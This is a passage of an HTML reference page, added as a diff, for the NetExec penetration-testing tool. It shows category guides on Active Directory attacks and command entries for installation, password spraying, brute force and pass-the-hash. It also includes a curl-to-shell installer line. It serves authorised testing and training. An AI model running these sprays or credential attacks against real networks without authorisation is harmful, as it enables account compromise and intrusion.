@@ -1,0 +1,1190 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="dark">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Exhaustive NetExec reference across SMB, LDAP, WinRM, MSSQL, SSH, FTP, RDP, WMI, and NFS.">
+    <meta name="theme-color" content="#020408">
+<title>NetExec Ultimate Reference - Complete AD Attack Guide</title>
+    <link rel="icon" type="image/svg+xml" href="favicon.svg">
+<style>
+@import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700&family=Inter:wght@400;500;600;700&display=swap');
+:root{--bg:#0a0e14;--bg2:#0d1117;--bg3:#161b22;--bg4:#1c2128;--card:#1a1f27;--border:#30363d;--text:#e6edf3;--text2:#8b949e;--muted:#6e7681;--green:#3fb950;--blue:#58a6ff;--purple:#a371f7;--orange:#f0883e;--red:#f85149;--yellow:#d29922;--cyan:#39c5cf;--pink:#db61a2;--mono:'JetBrains Mono',monospace;--sans:'Inter',sans-serif}
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:var(--sans);background:var(--bg);color:var(--text);line-height:1.6;font-size:14px}
+::-webkit-scrollbar{width:6px;height:6px}::-webkit-scrollbar-track{background:var(--bg2)}::-webkit-scrollbar-thumb{background:#484f58;border-radius:3px}
+a{color:var(--cyan);text-decoration:none}
+button{font-family:var(--sans);cursor:pointer}
+input,select{font-family:var(--sans)}
+
+/* Layout */
+.app{display:flex;flex-direction:column;min-height:100vh}
+.header{background:linear-gradient(180deg,#0f1419,var(--bg2));border-bottom:2px solid var(--green);padding:12px 20px;position:sticky;top:0;z-index:300}
+.header-top{display:flex;align-items:center;justify-content:space-between;margin-bottom:10px}
+.logo-section{display:flex;align-items:center;gap:12px}
+.logo{width:40px;height:40px;background:linear-gradient(135deg,var(--green),var(--cyan));border-radius:8px;display:flex;align-items:center;justify-content:center;font-family:var(--mono);font-weight:700;font-size:14px;color:var(--bg)}
+.title-block h1{font-size:20px;font-weight:700;color:var(--green);font-family:var(--mono)}
+.title-block p{font-size:11px;color:var(--text2)}
+.stats{display:flex;gap:20px}
+.stat{text-align:center}
+.stat-num{font-size:18px;font-weight:700;color:var(--green);font-family:var(--mono);display:block}
+.stat-label{font-size:9px;color:var(--muted);text-transform:uppercase}
+
+/* Generator Bar */
+.gen-bar{display:flex;flex-wrap:wrap;gap:8px;align-items:flex-end}
+.gen-group{display:flex;flex-direction:column;gap:2px}
+.gen-group label{font-size:9px;color:var(--muted);font-family:var(--mono);text-transform:uppercase}
+.gen-group input{padding:6px 10px;background:var(--bg);border:1px solid var(--border);border-radius:4px;color:var(--orange);font-family:var(--mono);font-size:11px;width:110px}
+.gen-group input:focus{outline:none;border-color:var(--orange);box-shadow:0 0 0 2px rgba(240,136,62,.15)}
+.gen-btn{padding:6px 14px;background:var(--green);border:none;border-radius:4px;color:var(--bg);font-size:11px;font-weight:600;height:28px}
+.gen-btn:hover{background:#4ac95f}
+.gen-btn.secondary{background:transparent;border:1px solid var(--border);color:var(--text2)}
+.gen-btn.secondary:hover{border-color:var(--red);color:var(--red)}
+
+/* Main Layout */
+.main{display:flex;flex:1}
+
+/* Sidebar */
+.sidebar{width:280px;background:var(--bg2);border-right:1px solid var(--border);height:calc(100vh - 100px);position:sticky;top:100px;overflow-y:auto;flex-shrink:0}
+.sidebar-search{padding:12px;border-bottom:1px solid var(--border)}
+.sidebar-search input{width:100%;padding:8px 12px;background:var(--bg);border:1px solid var(--border);border-radius:6px;color:var(--text);font-size:12px}
+.sidebar-search input:focus{outline:none;border-color:var(--green)}
+
+/* Nav Categories */
+.nav-cat{border-bottom:1px solid var(--border)}
+.nav-cat-header{padding:10px 14px;background:var(--bg3);display:flex;align-items:center;justify-content:space-between;cursor:pointer;font-size:12px;font-weight:600}
+.nav-cat-header:hover{background:var(--bg4)}
+.nav-cat-header .icon{width:20px;height:20px;border-radius:4px;display:flex;align-items:center;justify-content:center;font-size:11px;margin-right:8px}
+.nav-cat-header .count{font-size:10px;font-family:var(--mono);color:var(--muted);background:var(--bg);padding:2px 6px;border-radius:8px}
+.nav-cat-header .arrow{color:var(--muted);font-size:10px;transition:.2s}
+.nav-cat.open .arrow{transform:rotate(180deg)}
+.nav-cat-items{display:none;padding:4px 8px}
+.nav-cat.open .nav-cat-items{display:block}
+.nav-item{padding:6px 12px;border-radius:4px;cursor:pointer;font-size:11px;color:var(--text2);display:flex;justify-content:space-between;margin-bottom:2px}
+.nav-item:hover{background:var(--bg3);color:var(--text)}
+.nav-item.active{background:rgba(63,185,80,.15);color:var(--green);border-left:2px solid var(--green)}
+.nav-item .cnt{font-size:9px;color:var(--muted)}
+
+/* Content */
+.content{flex:1;padding:20px;overflow-y:auto}
+
+/* Section Header */
+.section-header{margin-bottom:20px;padding-bottom:16px;border-bottom:1px solid var(--border)}
+.section-header h2{font-size:22px;font-weight:700;margin-bottom:4px;display:flex;align-items:center;gap:10px}
+.section-header h2 .proto-badge{font-size:11px;padding:4px 10px;border-radius:4px;font-weight:600}
+.section-header p{color:var(--text2);font-size:13px;margin-bottom:12px}
+
+/* Guide Box */
+.guide-box{background:var(--bg3);border:1px solid var(--border);border-radius:8px;padding:16px;margin-bottom:20px}
+.guide-box h4{font-size:13px;font-weight:600;color:var(--cyan);margin-bottom:8px;display:flex;align-items:center;gap:6px}
+.guide-box p{font-size:12px;color:var(--text2);margin-bottom:8px}
+.guide-box ul{margin-left:20px;font-size:12px;color:var(--text2)}
+.guide-box li{margin-bottom:4px}
+.guide-box code{background:var(--bg);padding:2px 6px;border-radius:3px;font-family:var(--mono);font-size:11px;color:var(--orange)}
+.guide-box .tip{background:rgba(210,153,34,.1);border-left:3px solid var(--yellow);padding:8px 12px;margin-top:10px;font-size:11px;color:var(--text2);border-radius:0 4px 4px 0}
+.guide-box .warn{background:rgba(248,81,73,.1);border-left:3px solid var(--red);padding:8px 12px;margin-top:10px;font-size:11px;color:var(--text2);border-radius:0 4px 4px 0}
+
+/* Command Card */
+.cmd-card{background:var(--card);border:1px solid var(--border);border-radius:8px;margin-bottom:10px;overflow:hidden;transition:.15s}
+.cmd-card:hover{border-color:var(--text2)}
+.cmd-card.expanded{border-color:var(--green)}
+.cmd-header{padding:12px 16px;cursor:pointer;display:flex;align-items:center;gap:12px}
+.cmd-header:hover{background:var(--bg3)}
+.cmd-num{font-family:var(--mono);font-size:10px;color:var(--muted);min-width:24px}
+.cmd-main{flex:1}
+.cmd-title{font-size:13px;font-weight:600;margin-bottom:2px}
+.cmd-purpose{font-size:11px;color:var(--text2)}
+.cmd-badges{display:flex;gap:4px;flex-wrap:wrap}
+.badge{padding:3px 8px;border-radius:4px;font-size:9px;font-weight:600;text-transform:uppercase}
+.badge.proto{background:rgba(88,166,255,.15);color:var(--blue)}
+.badge.phase{color:var(--bg)}.badge.setup{background:var(--cyan)}.badge.recon{background:var(--blue)}.badge.enum{background:var(--purple)}.badge.cred{background:var(--yellow)}.badge.exploit{background:var(--orange)}.badge.post{background:var(--red)}
+.badge.noise{border:1px solid}.badge.low{color:var(--green);border-color:var(--green)}.badge.medium{color:var(--yellow);border-color:var(--yellow)}.badge.high{color:var(--red);border-color:var(--red)}
+.cmd-expand{color:var(--muted);font-size:14px;padding:4px 8px}
+
+/* Command Details */
+.cmd-details{display:none;border-top:1px solid var(--border);background:var(--bg3)}
+.cmd-card.expanded .cmd-details{display:block}
+.cmd-details-inner{padding:16px}
+.cmd-meta{display:grid;grid-template-columns:repeat(auto-fill,minmax(140px,1fr));gap:10px;margin-bottom:14px}
+.cmd-meta-item{background:var(--bg);padding:8px 10px;border-radius:4px}
+.cmd-meta-label{font-size:9px;color:var(--muted);text-transform:uppercase;display:block}
+.cmd-meta-value{font-size:11px;color:var(--text);font-weight:500}
+
+/* Command Box */
+.cmd-box{background:var(--bg);border:1px solid var(--border);border-radius:6px;padding:14px;font-family:var(--mono);font-size:12px;color:var(--green);position:relative;margin-bottom:12px}
+.cmd-box code{white-space:pre-wrap;word-break:break-all;display:block}
+.cmd-box .ph{color:var(--orange);font-weight:600}
+.cmd-box .filled{color:var(--cyan);font-weight:600}
+.copy-btn{position:absolute;top:8px;right:8px;padding:5px 12px;background:var(--bg3);border:1px solid var(--border);border-radius:4px;color:var(--text2);font-size:10px;font-family:var(--mono)}
+.copy-btn:hover{background:var(--green);color:var(--bg);border-color:var(--green)}
+.copy-btn.copied{background:var(--cyan);color:var(--bg);border-color:var(--cyan)}
+
+/* Tips */
+.cmd-tips{background:rgba(210,153,34,.08);border:1px solid rgba(210,153,34,.2);border-radius:6px;padding:10px 12px;font-size:11px}
+.cmd-tips-title{color:var(--yellow);font-weight:600;margin-bottom:4px;display:flex;align-items:center;gap:6px}
+.cmd-tips-content{color:var(--text2)}
+
+/* Filters */
+.filters{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:16px}
+.filter-group{display:flex;align-items:center;gap:6px}
+.filter-group label{font-size:10px;color:var(--muted);text-transform:uppercase}
+.filter-group select{padding:4px 8px;background:var(--bg);border:1px solid var(--border);border-radius:4px;color:var(--text);font-size:11px}
+
+/* Toast */
+.toast{position:fixed;bottom:20px;right:20px;padding:12px 20px;background:var(--green);color:var(--bg);border-radius:8px;font-weight:600;font-size:13px;z-index:1000;opacity:0;transform:translateY(20px);transition:.25s;pointer-events:none}
+.toast.show{opacity:1;transform:translateY(0)}
+
+/* Protocol Colors */
+.icon-smb{background:var(--purple)}.icon-ldap{background:var(--orange)}.icon-winrm{background:var(--cyan)}.icon-mssql{background:var(--yellow)}.icon-ssh{background:var(--green)}.icon-ftp{background:var(--blue)}.icon-rdp{background:var(--red)}.icon-wmi{background:var(--pink)}.icon-nfs{background:#f97316}.icon-setup{background:var(--cyan)}.icon-general{background:var(--blue)}
+
+/* Empty */
+.empty{text-align:center;padding:40px;color:var(--muted)}
+.empty .icon{font-size:40px;margin-bottom:12px}
+
+@media(max-width:1100px){.sidebar{width:240px}}
+@media(max-width:900px){.sidebar{display:none}}
+</style>
+
+<style id="mahdiesta-theme-style">
+:root {
+  --mah-bg: #020408;
+  --mah-bg-elevated: #080c14;
+  --mah-bg-card: #0d111c;
+  --mah-text: #e2e8f0;
+  --mah-text-secondary: #94a3b8;
+  --mah-border: #1e2740;
+  --mah-accent: #22d3ee;
+}
+[data-theme="light"] {
+  --mah-bg: #f8fafc;
+  --mah-bg-elevated: #ffffff;
+  --mah-bg-card: #ffffff;
+  --mah-text: #0f172a;
+  --mah-text-secondary: #475569;
+  --mah-border: #e2e8f0;
+  --mah-accent: #0891b2;
+}
+html, body {
+  background: var(--mah-bg) !important;
+  color: var(--mah-text) !important;
+}
+#theme-toggle-btn {
+  position: fixed;
+  bottom: 1rem;
+  right: 1rem;
+  z-index: 9999;
+  width: 40px;
+  height: 40px;
+  border-radius: 10px;
+  border: 1px solid var(--mah-border);
+  background: var(--mah-bg-card);
+  color: var(--mah-text-secondary);
+  cursor: pointer;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 1rem;
+  transition: all 0.25s ease;
+}
+#theme-toggle-btn:hover {
+  border-color: var(--mah-accent);
+  color: var(--mah-accent);
+}
+</style>
+</head>
+<body>
+<div class="app">
+<header class="header">
+<div class="header-top">
+<div class="logo-section">
+<div class="logo">NXC</div>
+<div class="title-block">
+<h1>NetExec Reference</h1>
+<p>by @MAHDIESTA</p>
+</div>
+</div>
+<div class="stats">
+<div class="stat"><span class="stat-num" id="total-cmds">261</span><span class="stat-label">Commands</span></div>
+<div class="stat"><span class="stat-num">10</span><span class="stat-label">Protocols</span></div>
+<div class="stat"><span class="stat-num" id="showing-cmds">261</span><span class="stat-label">Showing</span></div>
+</div>
+</div>
+<div class="gen-bar">
+<div class="gen-group"><label>Target IP/Range</label><input type="text" id="g-target" placeholder="192.168.1.0/24"></div>
+<div class="gen-group"><label>Username</label><input type="text" id="g-user" placeholder="administrator"></div>
+<div class="gen-group"><label>Password</label><input type="text" id="g-pass" placeholder="P@ssw0rd"></div>
+<div class="gen-group"><label>Domain</label><input type="text" id="g-domain" placeholder="CORP.LOCAL"></div>
+<div class="gen-group"><label>NT Hash</label><input type="text" id="g-hash" placeholder="aad3b435..."></div>
+<div class="gen-group"><label>Attacker IP</label><input type="text" id="g-attacker" placeholder="10.10.14.5"></div>
+<div class="gen-group"><label>Output File</label><input type="text" id="g-output" placeholder="output.txt"></div>
+<button class="gen-btn" onclick="refreshAll()">⚡ Apply All</button>
+<button class="gen-btn secondary" onclick="clearGlobals()">Clear</button>
+</div>
+</header>
+
+<div class="main">
+<aside class="sidebar" id="sidebar">
+<div class="sidebar-search">
+<input type="text" id="search" placeholder="🔍 Search commands..." oninput="filterCommands()">
+</div>
+<div id="nav-container"></div>
+</aside>
+<main class="content" id="content"></main>
+</div>
+</div>
+
+<div class="toast" id="toast">Copied!</div>
+
+<script>
+// ============================================
+// CATEGORY STRUCTURE WITH GUIDES
+// ============================================
+const categories = {
+    "Installation": {
+        icon: "⚙️",
+        color: "icon-setup",
+        guide: {
+            title: "Installing NetExec",
+            desc: "NetExec (nxc) is the modern continuation of CrackMapExec. Install using pipx for system-wide access to nxc and nxcdb.",
+            tips: [
+                "Install Rust first to avoid build errors",
+                "Use pipx for clean system-wide installation",
+                "Run 'pipx ensurepath' and open new shell after install"
+            ],
+            warn: "On Windows, ensure you have Git, Rust, and Visual C++ Build Tools installed first."
+        },
+        subs: ["Unix/pipx", "Kali Linux", "BlackArch", "ParrotSec", "Development", "Windows"]
+    },
+    "General": {
+        icon: "📋",
+        color: "icon-general",
+        guide: {
+            title: "General Usage",
+            desc: "Core functionality that applies across all protocols. Learn target formats, authentication methods, and credential handling.",
+            tips: [
+                "Wrap passwords with special chars in single quotes: -p 'P@ss!'",
+                "Use = for credentials starting with dash: -u='-user'",
+                "(Pwn3d!) means you have admin/code execution access",
+                "GREEN=success, RED=fail, MAGENTA=valid but restricted"
+            ]
+        },
+        subs: ["Help & Info", "Target Formats", "Authentication", "Brute Force", "Kerberos", "Certificates", "Modules", "DNS Options", "Database", "Logging"]
+    },
+    "SMB": {
+        icon: "📁",
+        color: "icon-smb",
+        guide: {
+            title: "SMB Protocol",
+            desc: "Server Message Block - primary protocol for Windows file sharing and AD enumeration. Most feature-rich protocol in NetExec.",
+            tips: [
+                "Start with null session checks: -u '' -p ''",
+                "Guest login check: -u 'a' -p ''",
+                "Generate relay list: --gen-relay-list targets.txt",
+                "Most credential dumping requires local admin"
+            ],
+            warn: "Credential dumping and command execution will trigger security alerts!"
+        },
+        subs: ["Enumeration", "Shares & Files", "Password Spray", "Authentication", "Command Exec", "Credential Dump", "LAPS", "Modules", "Impersonation"]
+    },
+    "LDAP": {
+        icon: "📚",
+        color: "icon-ldap",
+        guide: {
+            title: "LDAP Protocol",
+            desc: "Lightweight Directory Access Protocol - essential for AD enumeration, Kerberos attacks, and BloodHound collection.",
+            tips: [
+                "LDAPS is automatically used when needed (--gmsa)",
+                "Use --kdcHost when domain resolution fails",
+                "ASREPRoast works without authentication",
+                "BloodHound collection: --bloodhound --collection All"
+            ]
+        },
+        subs: ["Authentication", "User Enum", "Group Enum", "ASREPRoast", "Kerberoast", "Delegation", "gMSA", "ADCS", "BloodHound", "Trust Attacks", "DACL", "Misc"]
+    },
+    "WinRM": {
+        icon: "🖥️",
+        color: "icon-winrm",
+        guide: {
+            title: "WinRM Protocol",
+            desc: "Windows Remote Management - PowerShell remoting over HTTP/HTTPS. Requires membership in Remote Management Users group.",
+            tips: [
+                "Port 5985 (HTTP) or 5986 (HTTPS)",
+                "Use -d DOMAIN if SMB port is closed",
+                "Supports LAPS with --laps flag"
+            ]
+        },
+        subs: ["Authentication", "Password Spray", "Command Exec", "Credential Dump", "LAPS"]
+    },
+    "MSSQL": {
+        icon: "🗄️",
+        color: "icon-mssql",
+        guide: {
+            title: "MSSQL Protocol",
+            desc: "Microsoft SQL Server - database attacks including command execution via xp_cmdshell.",
+            tips: [
+                "Two auth methods: windows (default) or --local-auth",
+                "Check for impersonation with mssql_priv module",
+                "xp_cmdshell may need to be enabled first"
+            ]
+        },
+        subs: ["Authentication", "Password Spray", "Queries", "Command Exec", "File Transfer", "Privesc"]
+    },
+    "SSH": {
+        icon: "🔐",
+        color: "icon-ssh",
+        guide: {
+            title: "SSH Protocol",
+            desc: "Secure Shell - remote access to Linux/Unix systems.",
+            tips: [
+                "Use Hydra for faster SSH brute forcing",
+                "Specify custom port with --port"
+            ]
+        },
+        subs: ["Authentication", "Password Spray", "Command Exec", "File Transfer"]
+    },
+    "FTP": {
+        icon: "📤",
+        color: "icon-ftp",
+        guide: {
+            title: "FTP Protocol",
+            desc: "File Transfer Protocol - check for anonymous access and file transfers.",
+            tips: [
+                "Check anonymous login: -u anonymous -p anonymous",
+                "List files with --ls"
+            ]
+        },
+        subs: ["Authentication", "Password Spray", "File Ops"]
+    },
+    "RDP": {
+        icon: "🖵",
+        color: "icon-rdp",
+        guide: {
+            title: "RDP Protocol",
+            desc: "Remote Desktop Protocol - GUI remote access. Useful for screenshots and credential spraying.",
+            tips: [
+                "Take screenshots: --screenshot --screentime 5",
+                "NLA screenshot without auth: --nla-screenshot"
+            ]
+        },
+        subs: ["Authentication", "Password Spray", "Screenshots", "Command Exec"]
+    },
+    "WMI": {
+        icon: "⚡",
+        color: "icon-wmi",
+        guide: {
+            title: "WMI Protocol",
+            desc: "Windows Management Instrumentation - remote system management and command execution.",
+            tips: [
+                "Uses DCOM, may be blocked by firewalls",
+                "Good alternative when SMB exec fails"
+            ]
+        },
+        subs: ["Authentication", "Password Spray", "Command Exec"]
+    },
+    "NFS": {
+        icon: "💾",
+        color: "icon-nfs",
+        guide: {
+            title: "NFS Protocol",
+            desc: "Network File System - Linux/Unix file sharing. Check for root escape vulnerability!",
+            tips: [
+                "Root escape allows access to entire filesystem",
+                "Check /etc/exports for share configurations",
+                "no_root_squash + rw = full system compromise"
+            ],
+            warn: "Root escape can lead to complete system takeover!"
+        },
+        subs: ["Enumeration", "File Transfer", "Root Escape"]
+    },
+    "Vulnerabilities": {
+        icon: "🔓",
+        color: "icon-smb",
+        guide: {
+            title: "Vulnerability Scanning",
+            desc: "Check for critical vulnerabilities like ZeroLogon, PrintNightmare, and coercion attacks.",
+            tips: [
+                "Run these first on any engagement",
+                "Combine multiple: -M zerologon -M printnightmare",
+                "Coerce attacks can be chained with NTLM relay"
+            ]
+        },
+        subs: ["CVE Checks", "Coercion"]
+    }
+};
+
+// ============================================
+// ALL 261 COMMANDS - COMPLETE DATABASE
+// ============================================
+const commands = [
+// ========== INSTALLATION (24) ==========
+{id:1,n:"Install Rust (Unix)",cat:"Installation",sub:"Unix/pipx",proto:"Setup",ph:"setup",noise:"low",acc:"Local",cred:"None",purp:"Install Rust compiler - required dependency",cmd:"curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh",tips:"Reload shell after install so rust is in PATH. Required to avoid 'Failed building wheel for aardwolf' error."},
+{id:2,n:"Install pipx and git",cat:"Installation",sub:"Unix/pipx",proto:"Setup",ph:"setup",noise:"low",acc:"Local",cred:"None",purp:"Install pipx package manager and git",cmd:"sudo apt install pipx git",tips:"pipx allows system-wide use of NetExec and nxcdb."},
+{id:3,n:"Configure pipx PATH",cat:"Installation",sub:"Unix/pipx",proto:"Setup",ph:"setup",noise:"low",acc:"Local",cred:"None",purp:"Add pipx binaries to system PATH",cmd:"pipx ensurepath",tips:"Open a new shell after this command for changes to take effect."},
+{id:4,n:"Install NetExec via pipx",cat:"Installation",sub:"Unix/pipx",proto:"Setup",ph:"setup",noise:"low",acc:"Local",cred:"None",purp:"Install NetExec from GitHub",cmd:"pipx install git+https://github.com/Pennyw0rth/NetExec",tips:"Recommended installation method. Gets latest stable release."},
+{id:5,n:"Verify NetExec Installation",cat:"Installation",sub:"Unix/pipx",proto:"Setup",ph:"setup",noise:"low",acc:"Local",cred:"None",purp:"Run NetExec to verify installation",cmd:"nxc",tips:"Also try 'nxc --version' to check version."},
+{id:6,n:"Access NetExec Database",cat:"Installation",sub:"Unix/pipx",proto:"Setup",ph:"setup",noise:"low",acc:"Local",cred:"None",purp:"Open nxcdb credential database",cmd:"nxcdb",tips:"Stores all discovered credentials, hosts, and shares."},
+{id:7,n:"Update NetExec",cat:"Installation",sub:"Unix/pipx",proto:"Setup",ph:"setup",noise:"low",acc:"Local",cred:"None",purp:"Upgrade to latest version",cmd:"pipx upgrade netexec",tips:"Run periodically to get new features and bug fixes."},
+{id:8,n:"Force Reinstall NetExec",cat:"Installation",sub:"Unix/pipx",proto:"Setup",ph:"setup",noise:"low",acc:"Local",cred:"None",purp:"Force download latest from GitHub",cmd:"pipx reinstall netexec",tips:"Use when upgrade doesn't pull latest commits."},
+{id:9,n:"Kali - Update Packages",cat:"Installation",sub:"Kali Linux",proto:"Setup",ph:"setup",noise:"low",acc:"Local",cred:"None",purp:"Update Kali package lists",cmd:"apt update",tips:"Always run before installing packages."},
+{id:10,n:"Kali - Install NetExec",cat:"Installation",sub:"Kali Linux",proto:"Setup",ph:"setup",noise:"low",acc:"Local",cred:"None",purp:"Install NetExec on Kali Linux",cmd:"apt install netexec",tips:"Simplest method for Kali users. May not be latest version."},
+{id:11,n:"BlackArch - Install",cat:"Installation",sub:"BlackArch",proto:"Setup",ph:"setup",noise:"low",acc:"Local",cred:"None",purp:"Install on BlackArch Linux",cmd:"pacman -Syu netexec",tips:"Uses pacman package manager."},
+{id:12,n:"ParrotSec - Update",cat:"Installation",sub:"ParrotSec",proto:"Setup",ph:"setup",noise:"low",acc:"Local",cred:"None",purp:"Update ParrotSec packages",cmd:"apt update",tips:"Run before installation."},
+{id:13,n:"ParrotSec - Install",cat:"Installation",sub:"ParrotSec",proto:"Setup",ph:"setup",noise:"low",acc:"Local",cred:"None",purp:"Install on ParrotSec OS",cmd:"apt install netexec",tips:"Similar to Kali installation."},
+{id:14,n:"Dev - Install Rust",cat:"Installation",sub:"Development",proto:"Setup",ph:"setup",noise:"low",acc:"Local",cred:"None",purp:"Install Rust for development",cmd:"curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh",tips:"Required for building from source."},
+{id:15,n:"Dev - Install Dependencies",cat:"Installation",sub:"Development",proto:"Setup",ph:"setup",noise:"low",acc:"Local",cred:"None",purp:"Install dev dependencies",cmd:"apt install pipx git && pipx ensurepath",tips:"Prepares environment for UV or Poetry."},
+{id:16,n:"Dev - Install UV",cat:"Installation",sub:"Development",proto:"Setup",ph:"setup",noise:"low",acc:"Local",cred:"None",purp:"Install UV package manager",cmd:"pipx install uv",tips:"Modern Python package manager, faster than pip."},
+{id:17,n:"Dev - Clone Repository",cat:"Installation",sub:"Development",proto:"Setup",ph:"setup",noise:"low",acc:"Local",cred:"None",purp:"Clone NetExec source code",cmd:"git clone https://github.com/Pennyw0rth/NetExec && cd NetExec",tips:"Get the latest development version."},
+{id:18,n:"Dev - Run with UV",cat:"Installation",sub:"Development",proto:"Setup",ph:"setup",noise:"low",acc:"Local",cred:"None",purp:"Install and run with UV",cmd:"uv tool install . && uv run netexec",tips:"Quick way to run development version."},
+{id:19,n:"Dev - Install Poetry",cat:"Installation",sub:"Development",proto:"Setup",ph:"setup",noise:"low",acc:"Local",cred:"None",purp:"Install Poetry manager",cmd:"pipx install poetry",tips:"Do NOT install poetry via APT on Kali - will crash."},
+{id:20,n:"Dev - Poetry Plugin",cat:"Installation",sub:"Development",proto:"Setup",ph:"setup",noise:"low",acc:"Local",cred:"None",purp:"Add versioning plugin",cmd:'poetry self add "poetry-dynamic-versioning[plugin]" && poetry dynamic-versioning enable',tips:"Required for proper version handling."},
+{id:21,n:"Dev - Run with Poetry",cat:"Installation",sub:"Development",proto:"Setup",ph:"setup",noise:"low",acc:"Local",cred:"None",purp:"Install and run with Poetry",cmd:"poetry install && poetry run NetExec",tips:"Full development setup with Poetry."},
+{id:22,n:"Windows - Install pipx",cat:"Installation",sub:"Windows",proto:"Setup",ph:"setup",noise:"low",acc:"Local",cred:"None",purp:"Install pipx on Windows",cmd:"pip install pipx && python -m pipx ensurepath",tips:"Requires Python, Git, Rust, and Visual C++ Build Tools installed first."},
+{id:23,n:"Windows - Install NetExec",cat:"Installation",sub:"Windows",proto:"Setup",ph:"setup",noise:"low",acc:"Local",cred:"None",purp:"Install NetExec on Windows",cmd:"python -m pipx install git+https://github.com/Pennyw0rth/NetExec",tips:"Restart command line after installation."},
+{id:24,n:"Windows - Fix Long Paths",cat:"Installation",sub:"Windows",proto:"Setup",ph:"setup",noise:"low",acc:"Local",cred:"None",purp:"Enable long path support",cmd:'REG ADD "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\FileSystem" /v LongPathsEnabled /t REG_DWORD /d 1 /f',tips:"Fixes FileNotFoundError for long paths."},
+
+// ========== GENERAL USAGE (48) ==========
+{id:25,n:"Show Help",cat:"General",sub:"Help & Info",proto:"General",ph:"recon",noise:"low",acc:"Local",cred:"None",purp:"Display general help",cmd:"nxc --help",tips:"Shows all protocols: smb, ssh, ldap, ftp, wmi, winrm, rdp, vnc, mssql, nfs"},
+{id:26,n:"Protocol Help",cat:"General",sub:"Help & Info",proto:"General",ph:"recon",noise:"low",acc:"Local",cred:"None",purp:"Show protocol options",cmd:"nxc <PROTOCOL> --help",tips:"Each protocol has different options and capabilities."},
+{id:27,n:"List Modules",cat:"General",sub:"Help & Info",proto:"General",ph:"recon",noise:"low",acc:"Local",cred:"None",purp:"List available modules",cmd:"nxc <PROTOCOL> -L",tips:"Modules extend NetExec with additional attacks."},
+{id:28,n:"Module Options",cat:"General",sub:"Help & Info",proto:"General",ph:"recon",noise:"low",acc:"Local",cred:"None",purp:"Show module options",cmd:"nxc <PROTOCOL> -M <MODULE> --options",tips:"View required and optional parameters."},
+{id:29,n:"Target by Hostname",cat:"General",sub:"Target Formats",proto:"General",ph:"recon",noise:"low",acc:"Network",cred:"None",purp:"Target single host",cmd:"nxc <PROTOCOL> <HOSTNAME>",tips:"Requires DNS resolution."},
+{id:30,n:"Target Multiple IPs",cat:"General",sub:"Target Formats",proto:"General",ph:"recon",noise:"medium",acc:"Network",cred:"None",purp:"Target multiple hosts",cmd:"nxc <PROTOCOL> <IP1> <IP2>",tips:"Space-separated list."},
+{id:31,n:"Target CIDR Subnet",cat:"General",sub:"Target Formats",proto:"General",ph:"recon",noise:"high",acc:"Network",cred:"None",purp:"Target entire subnet",cmd:"nxc <PROTOCOL> <TARGET>/24",tips:"Scans all 254 hosts in /24."},
+{id:32,n:"Target IP Range",cat:"General",sub:"Target Formats",proto:"General",ph:"recon",noise:"high",acc:"Network",cred:"None",purp:"Target IP range",cmd:"nxc <PROTOCOL> <IP_START>-<IP_END>",tips:"Example: 192.168.1.1-192.168.1.50"},
+{id:33,n:"Target from File",cat:"General",sub:"Target Formats",proto:"General",ph:"recon",noise:"medium",acc:"Network",cred:"None",purp:"Load targets from file",cmd:"nxc <PROTOCOL> <TARGETS_FILE>",tips:"One target per line."},
+{id:34,n:"Basic Authentication",cat:"General",sub:"Authentication",proto:"General",ph:"enum",noise:"medium",acc:"Network",cred:"Password",purp:"Username and password auth",cmd:"nxc <PROTOCOL> <TARGET> -u <USER> -p <PASS>",tips:"(Pwn3d!) = admin access. GREEN=success, RED=fail, MAGENTA=valid but restricted."},
+{id:35,n:"Auth with Special Chars",cat:"General",sub:"Authentication",proto:"General",ph:"enum",noise:"medium",acc:"Network",cred:"Password",purp:"Password with special characters",cmd:"nxc <PROTOCOL> <TARGET> -u <USER> -p '<PASS>'",tips:"Wrap in single quotes: -p 'P@ss!word'"},
+{id:36,n:"Auth with Dash Prefix",cat:"General",sub:"Authentication",proto:"General",ph:"enum",noise:"medium",acc:"Network",cred:"Password",purp:"Credentials starting with dash",cmd:"nxc <PROTOCOL> <TARGET> -u='-<USER>' -p='-<PASS>'",tips:"Use = to avoid argument parsing errors."},
+{id:37,n:"Auth from Database",cat:"General",sub:"Authentication",proto:"General",ph:"enum",noise:"medium",acc:"Network",cred:"Database",purp:"Use credential from nxcdb",cmd:"nxc <PROTOCOL> <TARGET> -id <CRED_ID>",tips:"Pull creds from database by ID."},
+{id:38,n:"Users from File",cat:"General",sub:"Authentication",proto:"General",ph:"enum",noise:"medium",acc:"Network",cred:"Password",purp:"Load usernames from file",cmd:"nxc <PROTOCOL> <TARGET> -u <USERS_FILE> -p <PASS>",tips:"One username per line."},
+{id:39,n:"Spray Multiple Users",cat:"General",sub:"Brute Force",proto:"General",ph:"cred",noise:"high",acc:"Network",cred:"Password",purp:"Spray password to users",cmd:"nxc <PROTOCOL> <TARGET> -u <USER1> <USER2> -p <PASS>",tips:"Watch for account lockouts!"},
+{id:40,n:"Spray Multiple Passwords",cat:"General",sub:"Brute Force",proto:"General",ph:"cred",noise:"high",acc:"Network",cred:"Password",purp:"Try multiple passwords",cmd:"nxc <PROTOCOL> <TARGET> -u <USER> -p <PASS1> <PASS2>",tips:"Tests each password against user."},
+{id:41,n:"Spray from Files",cat:"General",sub:"Brute Force",proto:"General",ph:"cred",noise:"high",acc:"Network",cred:"Password",purp:"User and password files",cmd:"nxc <PROTOCOL> <TARGET> -u <USERS_FILE> -p <PASSWORDS_FILE>",tips:"Creates all user×password combinations."},
+{id:42,n:"Spray Hash Files",cat:"General",sub:"Brute Force",proto:"General",ph:"cred",noise:"high",acc:"Network",cred:"Hash",purp:"Spray NTLM hashes",cmd:"nxc <PROTOCOL> <TARGET> -u <USERS_FILE> -H <HASHES_FILE>",tips:"Pass-the-hash across accounts."},
